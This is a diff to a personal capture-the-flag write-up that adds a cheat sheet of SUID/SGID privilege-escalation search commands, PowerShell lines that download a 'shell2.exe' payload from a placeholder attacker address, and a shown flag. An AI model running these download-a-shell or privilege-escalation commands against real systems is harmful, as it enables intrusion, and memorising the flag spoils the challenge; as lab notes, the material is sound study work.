@@ -1,11 +1,18 @@
 # writeUp
 Just my write up for CTF
 
-# some juicy  shit
+# SUID
 ```console
 $ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
+$ find / -perm -u=s -type f 2>/dev/null
 $ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
+```
+
+# powershell
+```
+powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
+powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
 ```
 
 # curl
@@ -31,3 +38,5 @@ Content-Type: text/plain; charset=utf-8
 
 thm{c10b5cb7546f359d19c747db2d0f47b3}
 ```
+
+find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null
